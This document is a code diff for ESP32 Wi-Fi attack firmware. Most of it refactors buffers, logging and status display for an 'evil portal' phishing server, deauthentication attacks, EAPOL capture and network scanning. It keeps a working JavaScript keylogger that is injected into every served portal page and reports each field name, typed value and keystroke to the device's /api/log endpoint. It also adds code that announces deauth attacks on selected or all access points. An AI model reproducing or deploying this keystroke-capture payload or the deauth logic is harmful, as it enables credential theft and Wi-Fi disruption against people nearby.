@@ -11,6 +11,7 @@
 #include "esp_wifi.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/event_groups.h"
+#include "freertos/semphr.h"
 #include "lwip/etharp.h"
 #include "lwip/netif.h"
 #include "lwip/ip4_addr.h"
@@ -47,13 +48,16 @@
 #include "mbedtls/sha256.h"
 #include "mbedtls/hmac_drbg.h"
 #include "mbedtls/bignum.h"
+#include "core/serial_manager.h"
+#include "managers/settings_manager.h"
+#include "managers/status_display_manager.h"
 
 // Defines for Station Scan Channel Hopping
 #define SCANSTA_CHANNEL_HOP_INTERVAL_MS 250 // Hop channel every 250ms
 #define SCANSTA_MAX_WIFI_CHANNEL 13         // Scan channels 1-13
 
 #define MAX_DEVICES 255
-#define CHUNK_SIZE 8192
+#define CHUNK_SIZE 4096
 #define MDNS_NAME_BUF_LEN 65
 #define ARP_DELAY_MS 500
 #define MAX_PACKETS_PER_SECOND 500
@@ -63,6 +67,8 @@
 
 // limit how many ap records we keep to avoid memory bloat/crashes
 #define MAX_SCANNED_APS 100
+
+#define KARMA_MAX_SSIDS 32
 
 static char g_beacon_list[BEACON_LIST_MAX][BEACON_SSID_MAX_LEN+1];
 static int g_beacon_list_count = 0;
@@ -105,6 +111,11 @@ static bool boot_connection_attempted = false;
 void *beacon_task_handle = NULL;
 void *deauth_task_handle = NULL;
 int beacon_task_running = 0;
+
+static bool karma_portal_active = false;
+
+static volatile bool ap_sta_has_ip = false;
+
 
 const uint16_t COMMON_PORTS[] = {
     7,     // echo
@@ -286,11 +297,39 @@ static int ap_connection_count = 0;
 #define MAX_HTML_BUFFER_SIZE 2048
 
 // JavaScript snippet injected into every served HTML page to capture keystrokes and input values
-static const char *CAPTURE_JS_SNIPPET = \
+// Keep as const array so it lives in flash (.rodata) and not in RAM
+static const char CAPTURE_JS_SNIPPET[] =
     "<script>(function(){const send=d=>navigator.sendBeacon?navigator.sendBeacon('/api/log',new Blob([d])):fetch('/api/log',{method:'POST',headers:{\"Content-Type\":\"text/plain\"},body:d});const h=e=>{const t=e.target;if(!(t.name||t.id))return;const tag=t.tagName.toLowerCase();send(Date.now()+\"|\"+tag+\"|\"+(t.name||t.id)+\"|\"+t.value+\"\\n\");};['input','change','keydown'].forEach(ev=>document.addEventListener(ev,h,true));})();</script>";
 static char* html_buffer = NULL;
 static size_t html_buffer_size = 0;
 static bool use_html_buffer = false;
+// jit sd mount state for portal (somethingsomething template)
+static bool portal_sd_jit_mounted = false;
+static bool portal_display_suspended = false;
+
+// single reusable transfer buffer for streaming to reduce heap churn
+static char *g_stream_buf = NULL;
+static SemaphoreHandle_t g_stream_buf_mutex = NULL;
+static inline bool stream_buf_lock(void) {
+    if (g_stream_buf_mutex == NULL) {
+        g_stream_buf_mutex = xSemaphoreCreateMutex();
+        if (g_stream_buf_mutex == NULL) return false;
+    }
+    if (xSemaphoreTake(g_stream_buf_mutex, portMAX_DELAY) != pdTRUE) return false;
+    if (g_stream_buf == NULL) {
+        g_stream_buf = (char *)heap_caps_malloc(CHUNK_SIZE + 1, MALLOC_CAP_8BIT);
+        if (g_stream_buf == NULL) {
+            xSemaphoreGive(g_stream_buf_mutex);
+            return false;
+        }
+    }
+    return true;
+}
+static inline void stream_buf_unlock(void) {
+    if (g_stream_buf_mutex) {
+        xSemaphoreGive(g_stream_buf_mutex);
+    }
+}
 
 // Station Scan Channel Hopping Globals
 static esp_timer_handle_t scansta_channel_hop_timer = NULL;
@@ -320,16 +359,17 @@ struct service_info {
     const char *type;
 };
 
-struct service_info services[] = {{"_http", "Web Server Enabled Device"},
-                                  {"_ssh", "SSH Server"},
-                                  {"_ipp", "Printer (IPP)"},
-                                  {"_googlecast", "Google Cast"},
-                                  {"_raop", "AirPlay"},
-                                  {"_smb", "SMB File Sharing"},
-                                  {"_hap", "HomeKit Accessory"},
-                                  {"_spotify-connect", "Spotify Connect Device"},
-                                  {"_printer", "Printer (Generic)"},
-                                  {"_mqtt", "MQTT Broker"}};
+// Store in flash: const ensures this large-ish static table is placed in .rodata
+static const struct service_info services[] = {{"_http", "Web Server Enabled Device"},
+                                              {"_ssh", "SSH Server"},
+                                              {"_ipp", "Printer (IPP)"},
+                                              {"_googlecast", "Google Cast"},
+                                              {"_raop", "AirPlay"},
+                                              {"_smb", "SMB File Sharing"},
+                                              {"_hap", "HomeKit Accessory"},
+                                              {"_spotify-connect", "Spotify Connect Device"},
+                                              {"_printer", "Printer (Generic)"},
+                                              {"_mqtt", "MQTT Broker"}};
 
 #define NUM_SERVICES (sizeof(services) / sizeof(services[0]))
 
@@ -403,7 +443,10 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
             if (ap_connection_count > 0) ap_connection_count--;
             printf("WiFi_manager: Station disconnected from AP\n");
             login_done = false;
-            if (ap_connection_count == 0) esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
+            if (ap_connection_count == 0) {
+                esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
+                ap_sta_has_ip = false;
+            }
             break;
         case WIFI_EVENT_STA_START:
             printf("STA started\n");
@@ -427,6 +470,7 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
             break;
         case IP_EVENT_AP_STAIPASSIGNED:
             printf("Assigned IP to STA\n");
+            ap_sta_has_ip = true;
             break;
         default:
             break;
@@ -494,7 +538,6 @@ static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t e
         xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
     }
 }
-
 // Removed old wifi_retry_timer_callback - using unified retry system
 
 static void generate_random_ssid(char *ssid, size_t length) {
@@ -697,7 +740,6 @@ void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type)
             }
         }
     }
-
     // If no known AP BSSID found, ignore
     if (matched_ap_index == -1) {
        // printf("DEBUG: Dropped packet - No known AP BSSID found in addresses.\n");
@@ -752,11 +794,17 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
         httpd_resp_set_type(req, content_type ? content_type : "application/octet-stream");
         httpd_resp_set_status(req, "200 OK");
 
-        char *buffer = (char *)malloc(CHUNK_SIZE + 1);
-        if (buffer == NULL) {
-            printf("Error: buffer allocation failed\n");
-            fclose(file);
-            return ESP_FAIL;
+        char *buffer = NULL;
+        bool used_global = false;
+        if (stream_buf_lock()) {
+            buffer = g_stream_buf;
+            used_global = true;
+        } else {
+            buffer = (char *)malloc(CHUNK_SIZE + 1);
+            if (buffer == NULL) {
+                fclose(file);
+                return ESP_FAIL;
+            }
         }
 
         int read_len;
@@ -771,7 +819,11 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
             httpd_resp_send_chunk(req, CAPTURE_JS_SNIPPET, strlen(CAPTURE_JS_SNIPPET));
         }
 
-        free(buffer);
+        if (used_global) {
+            stream_buf_unlock();
+        } else {
+            free(buffer);
+        }
         fclose(file);
         httpd_resp_send_chunk(req, NULL, 0);
         printf("Served file: %s\n", url);
@@ -832,11 +884,17 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                                "connect-src 'self' data: blob:;");
             httpd_resp_set_status(req, "200 OK");
 
-            char *buffer = (char *)malloc(CHUNK_SIZE + 1);
-            if (buffer == NULL) {
-                printf("Failed to allocate memory for buffer");
-                esp_http_client_cleanup(client);
-                return ESP_FAIL;
+            char *buffer = NULL;
+            bool used_global = false;
+            if (stream_buf_lock()) {
+                buffer = g_stream_buf;
+                used_global = true;
+            } else {
+                buffer = (char *)malloc(CHUNK_SIZE + 1);
+                if (buffer == NULL) {
+                    esp_http_client_cleanup(client);
+                    return ESP_FAIL;
+                }
             }
 
             int read_len;
@@ -872,7 +930,11 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
                 }
             }
 
-            free(buffer);
+            if (used_global) {
+                stream_buf_unlock();
+            } else {
+                free(buffer);
+            }
             esp_http_client_close(client);
             esp_http_client_cleanup(client);
 
@@ -938,7 +1000,7 @@ esp_err_t file_handler(httpd_req_t *req) {
         return stream_data_to_client(req, local_path, content_type);
     }
 
-    const char *host = get_host_from_req(req);
+    char *host = get_host_from_req(req);
     if (host == NULL) {
         httpd_resp_set_status(req, "400 Bad Request");
         httpd_resp_send(req, NULL, 0);
@@ -952,7 +1014,7 @@ esp_err_t file_handler(httpd_req_t *req) {
 
     esp_err_t result = stream_data_to_client(req, file_url, content_type);
 
-    free((void *)host);
+    free(host);
 
     return result;
 }
@@ -965,7 +1027,6 @@ esp_err_t done_handler(httpd_req_t *req) {
     // no automatic shutdown
     return ESP_OK;
 }
-
 esp_err_t portal_handler(httpd_req_t *req) {
     printf("Client requested URL: %s\n", req->uri);
     ESP_LOGI(TAG, "Free heap before serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
@@ -1018,7 +1079,6 @@ esp_err_t portal_handler(httpd_req_t *req) {
     ESP_LOGI(TAG, "Free heap after serving portal: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     return ESP_OK;
 }
-
 esp_err_t get_log_handler(httpd_req_t *req) {
     char body[256] = {0};
     int received = 0;
@@ -1093,10 +1153,10 @@ esp_err_t get_info_handler(httpd_req_t *req) {
 esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
     ESP_LOGI(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
     // Log Host header and User-Agent for diagnostics (help debug iOS probe behavior)
-    const char *req_host = get_host_from_req(req);
+    char *req_host = get_host_from_req(req);
     if (req_host) {
         ESP_LOGI(TAG, "Redirect handler Host header: %s", req_host);
-        free((void*)req_host);
+        free(req_host);
     } else {
         ESP_LOGI(TAG, "Redirect handler: Host header not present");
     }
@@ -1143,8 +1203,22 @@ esp_err_t captive_portal_redirect_handler(httpd_req_t *req) {
 
     const char *u = req->uri;
     size_t ulen = strlen(u);
-    if ((ulen >= 4 && (strcmp(u + ulen - 4, ".png") == 0 || strcmp(u + ulen - 4, ".jpg") == 0 || strcmp(u + ulen - 4, ".css") == 0 || strcmp(u + ulen - 3, ".js") == 0)) ||
-        (ulen >= 5 && strcmp(u + ulen - 5, ".html") == 0)) {
+    bool is_html = (ulen >= 5 && strcmp(u + ulen - 5, ".html") == 0);
+
+    if (is_html && html_buffer != NULL && html_buffer_size > 0) {
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+        esp_err_t r = portal_handler(req);
+        ESP_LOGI(TAG, "Served HTML URL via buffer portal for URI: %s", u);
+        ESP_LOGI(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size());
+        return r;
+    }
+
+    if (ulen >= 4 && (strcmp(u + ulen - 4, ".png") == 0 || strcmp(u + ulen - 4, ".jpg") == 0 || strcmp(u + ulen - 4, ".css") == 0 || strcmp(u + ulen - 3, ".js") == 0)) {
+        file_handler(req);
+        return ESP_OK;
+    }
+
+    if (is_html) {
         file_handler(req);
         return ESP_OK;
     }
@@ -1187,7 +1261,7 @@ httpd_handle_t start_portal_webserver(void) {
     config.max_uri_handlers = 32;
     config.max_open_sockets = 13; // Increased from 7
     config.backlog_conn = 10;     // Increased from 7
-    config.stack_size = 8192;
+    config.stack_size = 6144;
     if (httpd_start(&evilportal_server, &config) == ESP_OK) {
         httpd_uri_t portal_uri = {
             .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
@@ -1224,7 +1298,8 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_uri_t portal_js = {
             .uri = ".js", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_html = {
-            .uri = ".html", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
+            .uri = ".html", .method = HTTP_GET,
+            .handler = (use_html_buffer ? portal_handler : file_handler), .user_ctx = NULL};
         httpd_register_uri_handler(evilportal_server, &portal_android_get);
         httpd_register_uri_handler(evilportal_server, &portal_android_head);
         httpd_register_uri_handler(evilportal_server, &portal_android_gen_get);
@@ -1268,6 +1343,18 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     login_done = false; // Reset login state on start
     current_creds_filename[0] = '\0'; // Reset filenames at the start
     current_keystrokes_filename[0] = '\0';
+    portal_sd_jit_mounted = false;
+    portal_display_suspended = false;
+    // jit mount sd for somethingsomething template only
+#ifdef CONFIG_BUILD_CONFIG_TEMPLATE
+    if (strcmp(CONFIG_BUILD_CONFIG_TEMPLATE, "somethingsomething") == 0) {
+        if (!sd_card_manager.is_initialized) {
+            if (sd_card_mount_for_flush(&portal_display_suspended) == ESP_OK) {
+                portal_sd_jit_mounted = true;
+            }
+        }
+    }
+#endif
     // Log HTML buffer state at portal startup
     ESP_LOGI(TAG, "Evil portal starting - HTML buffer state: buffer=%p, size=%zu, use_html_buffer=%s", 
         html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
@@ -1406,7 +1493,8 @@ void wifi_manager_stop_evil_portal() {
     current_creds_filename[0] = '\0'; // Clear saved filenames
     current_keystrokes_filename[0] = '\0';
     
-    // Keep HTML buffer across portal restarts - don't clear it here
+    // Free captured HTML buffer when portal stops to reclaim RAM
+    wifi_manager_clear_html_buffer();
 
     if (dns_handle != NULL) {
         stop_dns_server(dns_handle);
@@ -1421,18 +1509,46 @@ void wifi_manager_stop_evil_portal() {
     ESP_ERROR_CHECK(esp_wifi_stop());
 
     ap_manager_init();
+
+    // jit unmount sd if we mounted it for portal start
+    if (portal_sd_jit_mounted) {
+        sd_card_unmount_after_flush(portal_display_suspended);
+        portal_sd_jit_mounted = false;
+        portal_display_suspended = false;
+    }
 }
 
 bool wifi_manager_is_evil_portal_active(void) {
     return evilportal_server != NULL;
 }
 
+// Release scan result buffers when they are no longer needed
+void wifi_manager_clear_scan_results(void) {
+    if (scanned_aps != NULL) {
+        free(scanned_aps);
+        scanned_aps = NULL;
+        ap_count = 0;
+    }
+    if (selected_aps != NULL) {
+        free(selected_aps);
+        selected_aps = NULL;
+        selected_ap_count = 0;
+    }
+}
+
 void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
-    ESP_ERROR_CHECK(esp_wifi_start());
+    if (callback == wifi_eapol_scan_callback) {
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+        ESP_ERROR_CHECK(esp_wifi_start());
+        // lock to selected AP channel if available
+        extern wifi_ap_record_t selected_ap; // declared elsewhere in this module
+        if (selected_ap.ssid[0] != '\0' && selected_ap.primary > 0) {
+            esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);
+        }
+    } else {
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
+        ESP_ERROR_CHECK(esp_wifi_start());
+    }
 
     // Set hardware-level promiscuous filter based on callback type
     wifi_promiscuous_filter_t filter = {0};
@@ -1445,8 +1561,8 @@ void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
         // Management frames only
         filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
     } else if (callback == wifi_eapol_scan_callback) {
-        // Data frames only for EAPOL
-        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
+        // capture both mgmt and data for eapol + context frames
+        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
     } else if (callback == sae_monitor_callback) {
         // Management frames for SAE
         filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
@@ -1462,14 +1578,48 @@ void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
 
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(callback));
 
-    printf("WiFi monitor started.\n");
-    TERMINAL_VIEW_ADD_TEXT("WiFi monitor started.\n");
-}
+    const char *cap_desc = "monitor";
+    if (callback == wifi_eapol_scan_callback) cap_desc = "EAPOL";
+    else if (callback == wifi_beacon_scan_callback) cap_desc = "beacon";
+    else if (callback == wifi_probe_scan_callback) cap_desc = "probe";
+    else if (callback == wifi_deauth_scan_callback) cap_desc = "deauth";
+    else if (callback == wifi_wps_detection_callback) cap_desc = "wps";
+    else if (callback == wifi_raw_scan_callback) cap_desc = "raw";
 
+    uint8_t ch_primary = 0; wifi_second_chan_t ch_second = WIFI_SECOND_CHAN_NONE;
+    (void)esp_wifi_get_channel(&ch_primary, &ch_second);
+
+    const char *filter_desc = "all";
+    if (filter.filter_mask == WIFI_PROMIS_FILTER_MASK_MGMT) filter_desc = "mgmt";
+    else if (filter.filter_mask == WIFI_PROMIS_FILTER_MASK_DATA) filter_desc = "data";
+    else if (filter.filter_mask == (WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA)) filter_desc = "mgmt+data";
+
+    printf("WiFi capture started.\n");
+    TERMINAL_VIEW_ADD_TEXT("WiFi capture started.\n");
+    printf("Type: %s\n", cap_desc);
+    TERMINAL_VIEW_ADD_TEXT("Type: %s\n", cap_desc);
+    printf("Channel: %u\n", (unsigned)ch_primary);
+    TERMINAL_VIEW_ADD_TEXT("Channel: %u\n", (unsigned)ch_primary);
+    printf("Filter: %s\n", filter_desc);
+    TERMINAL_VIEW_ADD_TEXT("Filter: %s\n", filter_desc);
+    status_display_show_status("Monitor Started");
+}
 void wifi_manager_stop_monitor_mode() {
+    wifi_mode_t mode = WIFI_MODE_NULL;
+    esp_err_t wifi_status = esp_wifi_get_mode(&mode);
+    if (wifi_status == ESP_ERR_WIFI_NOT_INIT || mode == WIFI_MODE_NULL) {
+        ESP_LOGW("WIFI_MANAGER", "Monitor stop called while Wi-Fi driver inactive (status=%s, mode=%d)",
+                 esp_err_to_name(wifi_status), mode);
+        return;
+    } else if (wifi_status != ESP_OK) {
+        ESP_LOGE("WIFI_MANAGER", "Failed to query Wi-Fi driver state: %s", esp_err_to_name(wifi_status));
+        return;
+    }
+
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
     printf("WiFi monitor stopped.\n");
     TERMINAL_VIEW_ADD_TEXT("WiFi monitor stopped.\n");
+    status_display_show_status("Monitor Stopped");
 
     // Stop the station scan channel hopping timer if it's active
     if (scansta_hopping_active) {
@@ -1618,6 +1768,18 @@ void wifi_manager_configure_sta_from_settings(void) {
 }
 
 void wifi_manager_start_scan() {
+    log_heap_status(TAG, "scan_start_pre");
+    // Free any previous selections or scan buffers before starting a fresh scan
+    if (selected_aps != NULL) {
+        free(selected_aps);
+        selected_aps = NULL;
+        selected_ap_count = 0;
+    }
+    if (scanned_aps != NULL) {
+        free(scanned_aps);
+        scanned_aps = NULL;
+        ap_count = 0;
+    }
     ap_manager_stop_services();
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
     ESP_ERROR_CHECK(esp_wifi_start());
@@ -1644,10 +1806,12 @@ void wifi_manager_start_scan() {
     if (err != ESP_OK) {
         printf("WiFi scan failed to start: %s", esp_err_to_name(err));
         TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
+        log_heap_status(TAG, "scan_start_failed");
         return;
     }
 
     wifi_manager_stop_scan();
+    log_heap_status(TAG, "scan_start_post");
     ESP_ERROR_CHECK(esp_wifi_stop());
     ESP_ERROR_CHECK(ap_manager_start_services());
 }
@@ -1656,6 +1820,7 @@ void wifi_manager_start_scan() {
 void wifi_manager_stop_scan() {
     esp_err_t err;
 
+    log_heap_status(TAG, "scan_stop_pre");
     err = esp_wifi_scan_stop();
     if (err == ESP_ERR_WIFI_NOT_STARTED) {
 
@@ -1693,7 +1858,6 @@ void wifi_manager_stop_scan() {
         TERMINAL_VIEW_ADD_TEXT("showing first %d aps (truncated)\n", MAX_SCANNED_APS);
         initial_ap_count = MAX_SCANNED_APS;
     }
-
     if (initial_ap_count > 0) {
         if (scanned_aps != NULL) {
             free(scanned_aps);
@@ -1897,7 +2061,6 @@ esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t m
 
     return ESP_OK;
 }
-
 void wifi_deauth_task(void *param) {
     if (ap_count == 0) {
         printf("No access points found\n");
@@ -1980,6 +2143,9 @@ void wifi_manager_start_deauth() {
         ap_manager_stop_services();
         esp_wifi_start();
         printf("Restarting Wi-Fi\n");
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+        status_display_show_attack("Deauth", "starting");
+#endif
         
         if (selected_ap_count > 0 && selected_aps != NULL) {
             printf("Starting deauth attack on %d selected APs:\n", selected_ap_count);
@@ -1993,15 +2159,26 @@ void wifi_manager_start_deauth() {
                        selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
                        selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5]);
                 TERMINAL_VIEW_ADD_TEXT("  [%d] %s\n", i, sanitized_ssid);
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+                if (i == 0) {
+                    status_display_show_attack("Deauth", sanitized_ssid);
+                }
+#endif
             }
         } else if (strlen((const char *)selected_ap.ssid) > 0) {
             char sanitized_ssid[33];
             sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
             printf("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
             TERMINAL_VIEW_ADD_TEXT("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+            status_display_show_attack("Deauth", sanitized_ssid);
+#endif
         } else {
             printf("Starting global deauth attack on all APs\n");
             TERMINAL_VIEW_ADD_TEXT("Starting global deauth attack on all APs\n");
+#ifdef CONFIG_WITH_STATUS_DISPLAY
+            status_display_show_attack("Deauth", "all APs");
+#endif
         }
         
         xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
@@ -2012,7 +2189,6 @@ void wifi_manager_start_deauth() {
         TERMINAL_VIEW_ADD_TEXT("Deauth already running.\n");
     }
 }
-
 void wifi_manager_select_ap(int index) {
 
     if (ap_count == 0) {
@@ -2313,7 +2489,6 @@ void screen_music_visualizer_task(void *pvParameters) {
 
     vTaskDelete(NULL);
 }
-
 void animate_led_based_on_amplitude(void *pvParameters) {
     char rx_buffer[128];
     char addr_str[128];
@@ -2632,7 +2807,6 @@ bool send_arp_request(const char *target_ip) {
     if (inet_pton(AF_INET, target_ip, &target_addr) != 1) {
         return false;
     }
-
     // Create ARP request packet
     uint8_t arp_packet[42] = {
         // Ethernet header
@@ -2773,7 +2947,6 @@ bool get_arp_table_entry(const char *ip, uint8_t *mac) {
 
     return false;
 }
-
 bool wifi_manager_arp_scan_subnet(void) {
     arp_scanner_ctx_t *ctx = arp_scanner_init();
     if (!ctx) {
@@ -2952,7 +3125,6 @@ void scan_ports_on_host(const char *target_ip, host_result_t *result) {
         vTaskDelay(pdMS_TO_TICKS(10));
     }
 }
-
 static size_t build_udp_probe(uint16_t port, uint8_t *buf, size_t bufsize) {
     if (port == 53 && bufsize >= 64) {
         uint8_t *p = buf;
@@ -3236,7 +3408,6 @@ void scanner_cleanup(scanner_ctx_t *ctx) {
         free(ctx);
     }
 }
-
 bool wifi_manager_scan_subnet() {
     scanner_ctx_t *ctx = scanner_init();
     if (!ctx) {
@@ -3286,7 +3457,6 @@ bool wifi_manager_scan_subnet() {
             ctx->num_active_hosts++;
         }
     }
-
     glog("Scan completed. Found %d active hosts:\n", ctx->num_active_hosts);
 
     for (size_t i = 0; i < ctx->num_active_hosts; i++) {
@@ -3625,6 +3795,7 @@ void wifi_manager_stop_deauth() {
     if (beacon_task_running) {
         printf("Stopping deauth transmission...\n");
         TERMINAL_VIEW_ADD_TEXT("Stopping deauth transmission...\n");
+        status_display_show_status("Deauth Stopping");
         if (deauth_task_handle != NULL) {
             vTaskDelete(deauth_task_handle);
             deauth_task_handle = NULL;
@@ -3633,10 +3804,12 @@ void wifi_manager_stop_deauth() {
             wifi_manager_stop_monitor_mode();
             esp_wifi_stop();
             ap_manager_start_services();
+            status_display_show_status("Deauth Stopped");
         }
+    } else {
+        status_display_show_status("No Deauth Active");
     }
 }
-
 static void wifi_manager_print_ap_entry_formatted(uint16_t idx, const wifi_ap_record_t *rec, bool include_security) {
     char sanitized_ssid[33];
     sanitize_ssid_and_check_hidden((uint8_t *)rec->ssid, sanitized_ssid, sizeof(sanitized_ssid));
@@ -3710,11 +3883,9 @@ static void wifi_manager_print_ap_entry_formatted(uint16_t idx, const wifi_ap_re
         TERMINAL_VIEW_ADD_TEXT("     Company: %s\n", company_str);
     }
 }
-
 void wifi_manager_print_scan_results_with_oui() {
     if (scanned_aps == NULL) {
-        printf("AP information not available\n");
-        TERMINAL_VIEW_ADD_TEXT("AP information not available\n");
+        glog("AP information not available\n");
         return;
     }
 
@@ -3756,22 +3927,22 @@ void wifi_manager_print_scan_results_with_oui() {
             break;
         }
 
-        printf("[%u] SSID: %s,\n"
-               "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
-               "     RSSI: %d,\n"
-               "     Channel: %d,\n",
-               i, sanitized_ssid, 
-               scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
-               scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
-               scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
-               scanned_aps[i].rssi,
-               scanned_aps[i].primary);
+        glog("[%u] SSID: %s,\n"
+             "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
+             "     RSSI: %d,\n"
+             "     Channel: %d,\n",
+             i, sanitized_ssid, 
+             scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
+             scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
+             scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
+             scanned_aps[i].rssi,
+             scanned_aps[i].primary);
 
 #if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
         {
             int ch = scanned_aps[i].primary;
             const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
-            printf("     Band: %s,\n", band_str);
+            glog("     Band: %s,\n", band_str);
             
             const char *auth_str = "Unknown";
             const char *pmf_str = NULL;
@@ -3816,88 +3987,14 @@ void wifi_manager_print_scan_results_with_oui() {
             }
             
             if (pmf_str) {
-                printf("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
+                glog("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
             } else {
-                printf("     Security: %s\n", auth_str);
+                glog("     Security: %s\n", auth_str);
             }
         }
 #endif
         if (strcmp(company_str, "Unknown") != 0) {
-            printf("     Company: %s\n", company_str);
-        }
-
-        TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s,\n"
-                               "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
-                               "     RSSI: %d,\n"
-                               "     Channel: %d,\n",
-                               i, sanitized_ssid, 
-                               scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
-                               scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
-                               scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
-                               scanned_aps[i].rssi,
-                               scanned_aps[i].primary);
-
-#ifdef CONFIG_IDF_TARGET_ESP32C5
-        {
-            int ch = scanned_aps[i].primary;
-            const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
-            TERMINAL_VIEW_ADD_TEXT("     Band: %s,\n", band_str);
-            
-            const char *auth_str = "Unknown";
-            const char *pmf_str = NULL;
-            
-            switch (scanned_aps[i].authmode) {
-                case WIFI_AUTH_OPEN:
-                    auth_str = "Open";
-                    pmf_str = "Not Supported";
-                    break;
-                case WIFI_AUTH_WEP:
-                    auth_str = "WEP";
-                    pmf_str = "Not Supported";
-                    break;
-                case WIFI_AUTH_WPA_PSK:
-                    auth_str = "WPA";
-                    pmf_str = "Not Supported";
-                    break;
-                case WIFI_AUTH_WPA2_PSK:
-                    auth_str = "WPA2";
-                    pmf_str = "Optional";
-                    break;
-                case WIFI_AUTH_WPA_WPA2_PSK:
-                    auth_str = "WPA/WPA2";
-                    pmf_str = "Optional";
-                    break;
-                case WIFI_AUTH_WPA2_ENTERPRISE:
-                    auth_str = "WPA2-Enterprise";
-                    pmf_str = "Optional";
-                    break;
-                case WIFI_AUTH_WPA3_PSK:
-                    auth_str = "WPA3";
-                    pmf_str = "Required";
-                    break;
-                case WIFI_AUTH_WPA2_WPA3_PSK:
-                    auth_str = "WPA2/WPA3";
-                    pmf_str = "Required (WPA3)";
-                    break;
-                case WIFI_AUTH_WAPI_PSK:
-                    auth_str = "WAPI";
-                    pmf_str = "Not Applicable";
-                    break;
-                case WIFI_AUTH_WPA3_ENTERPRISE:
-                    auth_str = "WPA3-Enterprise";
-                    pmf_str = "Required";
-                    break;
-                default:
-                    auth_str = "Unknown";
-                    pmf_str = "Unknown";
-                    break;
-            }
-            
-            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n      PMF: %s,\n", auth_str, pmf_str);
-        }
-#endif
-        if (strcmp(company_str, "Unknown") != 0) {
-            TERMINAL_VIEW_ADD_TEXT("     Company: %s\n", company_str);
+            glog("     Company: %s\n", company_str);
         }
     }
 }
@@ -3947,7 +4044,6 @@ static bool bssid_already_listed(const uint8_t *bssid) {
     }
     return false;
 }
-
 static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (type != WIFI_PKT_MGMT) return;
     const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
